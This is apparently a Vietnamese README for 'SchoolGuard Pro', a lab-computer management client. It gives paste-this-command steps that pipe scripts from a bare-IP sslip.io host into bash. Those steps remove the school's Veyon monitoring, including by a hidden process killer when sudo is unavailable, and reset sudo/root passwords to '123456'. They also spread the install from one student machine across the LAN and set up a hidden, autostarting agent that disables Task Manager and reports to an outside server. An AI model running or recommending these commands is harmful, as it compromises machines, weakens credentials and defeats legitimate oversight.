# Hệ Thống Quản Lý Phòng Máy SchoolGuard Pro (Client Setup)

Bộ cài đặt chuyên biệt dành cho máy trạm học sinh (**Xubuntu Linux** và **Windows 7/10/11**), tích hợp công cụ **tắt hẳn, vô hiệu hóa và xóa sạch hoàn toàn Veyon** khỏi máy học sinh.

> ⚠️ **Lưu ý**: Kho lưu trữ này **chỉ chứa bộ công cụ cài đặt dành cho máy học sinh Client**, tuyệt đối không bao gồm mã nguồn máy chủ quản trị (`server/`). Máy chủ quản lý trung tâm hoạt động tại: **[https://103-149-172-179.sslip.io](https://103-149-172-179.sslip.io)**.

---

## 🚀 QUY TRÌNH 2 BƯỚC CÀI ĐẶT NHANH (KHUYÊN DÙNG)

Để đảm bảo máy học sinh hoạt động ổn định và giải phóng hoàn toàn khỏi xung đột phần mềm cũ, hãy thực hiện tuần tự **2 bước**:

```
[BƯỚC 1: Xóa Sạch Veyon]  ──▶  [BƯỚC 2: Cài Đặt SchoolGuard Pro]
```

---

### A. DÀNH CHO MÁY HỌC SINH XUBUNTU LINUX

#### Cách 1: Chạy Dòng Lệnh Terminal (Nhanh nhất - Không cần mật khẩu sudo)
Nhấn tổ hợp phím **`Ctrl + Alt + T`** trên máy học sinh để mở Terminal:

1. **Bước 1: Tiêu diệt & Xóa sạch Veyon**
   ```bash
   wget -qO- https://103-149-172-179.sslip.io/remove-veyon.sh | bash
   ```
   *(Hoặc tải từ GitHub)*:
   ```bash
   wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/remove-veyon.sh | bash
   ```
   *Cơ chế tự động: Nếu có quyền sudo, script sẽ dừng, mask `veyon.service` và purge hoàn toàn gói veyon qua `apt`. Nếu không có mật khẩu sudo, script tự kích hoạt bộ chặn ngầm liên tục tiêu diệt `veyon-worker` và giải phóng khóa chuột/phím `xinput`.*

2. **Bước 2: Cài đặt SchoolGuard Pro**
   ```bash
   wget -qO- https://103-149-172-179.sslip.io/install.sh | bash
   ```
   *(Hoặc tải từ GitHub)*:
   ```bash
   wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | bash
   ```

3. **Bước 3 (Tùy chọn cho Quản trị viên): Đặt lại mật khẩu `sudo` / `root` về `123456`**
   Mở Terminal (`Ctrl + Alt + T` hoặc GRUB Root Shell) và chạy:
   ```bash
   wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/reset-sudo.sh | bash
   ```

4. **Bước 4 (Tự động cài lan truyền từ 1 máy học sinh sang cả phòng cùng mạng LAN):**
   Chỉ cần ngồi tại **1 máy học sinh bất kỳ**, mở `Ctrl + Alt + T` và chạy:
   ```bash
   wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/lan-deploy.sh | bash
   ```
   *(Hoặc từ máy khác trong cùng phòng tải trực tiếp từ trạm phát nội bộ của máy đã cài: `curl -sSL http://<IP-MÁY-ĐÃ-CÀI>:8888/go | bash`)*

#### Cách 2: Bấm Đúp Chuột (Dùng USB hoặc tải file nén)
1. Tải file **[SchoolGuard-Xubuntu-Setup.tar.gz](./SchoolGuard-Xubuntu-Setup.tar.gz)** vào USB hoặc máy học sinh.
2. Chuột phải vào file nén chọn **Extract Here** (Giải nén tại đây) $\rightarrow$ Mở thư mục `SchoolGuard-Setup`.
3. **Bấm đúp chuột** vào file: **`1-Xoa-Sach-Veyon.desktop`** (Bước 1).
4. Sau khi hoàn tất, **bấm đúp chuột** vào file: **`2-Cai-Dat-SchoolGuard.desktop`** (Bước 2).
5. Quá trình hoàn tất, máy học sinh tự động kết nối về màn hình giáo viên!

---

### B. DÀNH CHO MÁY HỌC SINH WINDOWS (7 / 10 / 11)

*Bộ cài Windows thuần PowerShell/.NET, không yêu cầu cài đặt Python hay thư viện ngoài.*

#### Cách 1: Chạy Dòng Lệnh CMD hoặc PowerShell (Chạy dưới quyền Administrator)
Mở **Command Prompt (CMD)** hoặc **PowerShell**:

1. **Bước 1: Tiêu diệt & Xóa sạch Veyon**
   ```cmd
   curl -s https://103-149-172-179.sslip.io/Xoa-Sach-Veyon-Windows.bat -o %TEMP%\xoa_veyon.bat && %TEMP%\xoa_veyon.bat
   ```
   *Script tự động dừng/xóa dịch vụ `VeyonService`, kill sạch `VeyonWorker.exe`, chạy trình gỡ cài đặt im lặng `/S`, dọn dẹp thư mục, registry và gọi `BlockInput($false)` giải phóng chuột phím.*

2. **Bước 2: Cài đặt SchoolGuard Pro**
   ```cmd
   curl -s https://103-149-172-179.sslip.io/Cai-Dat-SchoolGuard-Windows.bat -o %TEMP%\sg_setup.bat && %TEMP%\sg_setup.bat
   ```
   *Script tự động copy agent vào `C:\ProgramData\SchoolGuard`, thiết lập chạy ẩn qua VBScript, đăng ký tự khởi động cùng Windows và kết nối trực tiếp đến Web Quản lý.*

#### Cách 2: 1-Click Bằng File Batch (Dùng USB hoặc tải trực tiếp)
1. Copy các file sau vào máy học sinh:
   - `Xoa-Sach-Veyon-Windows.bat` và `remove_veyon_win.ps1`
   - `Cai-Dat-SchoolGuard-Windows.bat` và `agent_win.ps1`
2. Chuột phải vào **`Xoa-Sach-Veyon-Windows.bat`** chọn **Run as administrator** (Bước 1).
3. Chuột phải vào **`Cai-Dat-SchoolGuard-Windows.bat`** chọn **Run as administrator** (Bước 2).

---

## 🛡️ TÍNH NĂNG VÀ CƠ CHẾ BẢO VỆ CỦA SCHOOLGUARD PRO

| Tính Năng | Xubuntu Client | Windows Client |
|---|---|---|
| **Khóa Màn Hình Toàn Diện** | GTK3 / Tkinter Overlay UI, Machine Badge, Lời nhắn giáo viên | .NET GDI+ Fullscreen Overlay, Machine Badge, Lời nhắn |
| **Khóa Chuột & Bàn Phím** | `xinput disable` cho toàn bộ slave devices | Win32 Low-level Keyboard Hook + `BlockInput` |
| **Chống Đóng & Vô Hiệu TaskMgr** | Chặn tổ hợp phím X11, tự phục hồi process | Khóa Task Manager (`DisableTaskMgr`), chặn `Ctrl+Alt+Del` |
| **Trình Chiếu Bài Giảng** | Nhận luồng ảnh JPEG thời gian thực từ giáo viên | Hiển thị PictureBox thời gian thực siêu mượt |
| **Cứu Máy Tức Thì Khi Mở Khóa** | Tự động kill mọi tiến trình `veyon-worker` còn sót | Tự động kill `VeyonWorker.exe` & release `BlockInput` |
| **Tắt Veyon Từ Xa** | Nhận lệnh `DISABLE_VEYON` từ Web Dashboard | Dừng dịch vụ và vô hiệu hóa Veyon từ xa |
| **Tự Khởi Động Cùng Hệ Thống** | `systemd --user` + XFCE Autostart + Cron Watchdog | HKLM/HKCU Run + Windows Scheduled Task (onlogon) |

---

## 📞 HỖ TRỢ VÀ QUẢN TRỊ VIÊN
- **Giao diện Web Giáo viên**: `https://103-149-172-179.sslip.io`
- **Tài khoản**: Đăng nhập theo phân quyền giáo viên / quản trị viên phòng máy.
